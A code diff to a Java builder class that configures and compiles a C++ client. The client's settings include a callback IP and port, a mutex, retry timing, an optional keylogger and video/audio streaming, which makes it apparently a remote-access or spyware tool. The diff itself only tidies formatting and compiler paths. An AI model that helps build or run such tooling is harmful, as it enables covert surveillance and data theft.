@@ -46,17 +46,21 @@ public class Compiler implements ActionListener {
         if (returnVal == JFileChooser.APPROVE_OPTION) {
             setAssemblySettings();
             // Set IP
-            modifier.variableModifier("IP","\""+fieldsArray[0].getText()+"\"");
+            modifier.variableModifier("IP", "\"" + fieldsArray[0].getText() + "\"");
             // Set PORT
-            modifier.variableModifier("PORT",fieldsArray[1].getText());
+            modifier.variableModifier("PORT", fieldsArray[1].getText());
             // Set tag name
-            modifier.variableModifier("TAG_NAME","\""+fieldsArray[2].getText()+"\"");
+            modifier.variableModifier("TAG_NAME", "\"" + fieldsArray[2].getText() + "\"");
             // Set mutex
-            modifier.variableModifier("MUTEX","\""+fieldsArray[3].getText()+"\"");
+            modifier.variableModifier("MUTEX", "\"" + fieldsArray[3].getText() + "\"");
             // Set timing
-            modifier.variableModifier("TIMING_RETRY",fieldsArray[4].getText());
+            modifier.variableModifier("TIMING_RETRY", fieldsArray[4].getText());
             // Create command line
-            command.append(fieldsArray[5].getText()).append(" compile_configuration/compiled_assembly.opc client.cpp " +
+            String utilities = fieldsArray[5].getText();
+            String pathOfUtilities = "";
+            if (!utilities.equals("g++ / windres")) pathOfUtilities = utilities;
+            String assemblyCommand = Path.of(pathOfUtilities, "windres") + " assembly.rc compiled_assembly.opc";
+            command.append(Path.of(pathOfUtilities, "g++")).append(" compile_configuration/compiled_assembly.opc client.cpp " +
                     "video_audio/DeviceEnumerator.cpp " +
                     "stream/Stream.cpp  " +
                     "time/Time.cpp  converter/Converter.cpp " +
@@ -112,20 +116,20 @@ public class Compiler implements ActionListener {
             } else modifier.removeInclude("#define KEYLOGGER");
             modifier.writeToFile();
             System.out.println(command);
-            compile(command.toString());
+            compile(command.toString(), assemblyCommand);
         }
 
     }
 
     // Thread for compiling the project opening shell in client project directory
-    private void compile(String command) {
+    private void compile(String compileCommand, String assemblyCommand) {
         new Thread(() -> {
             ProcessBuilder assemblyProcess = new ProcessBuilder();
-            assemblyProcess.command("cmd.exe", "/c", "windres assembly.rc compiled_assembly.opc").directory(assemblyPath.toFile());
+            assemblyProcess.command("cmd.exe", "/c", assemblyCommand).directory(assemblyPath.toFile());
             executeProcess(assemblyProcess);
 
             ProcessBuilder compileProcess = new ProcessBuilder();
-            compileProcess.command("cmd.exe", "/c", command).directory(localClientFiles.toFile());
+            compileProcess.command("cmd.exe", "/c", compileCommand).directory(localClientFiles.toFile());
             executeProcess(compileProcess);
             System.out.println("Finished compiling");
         }).start();
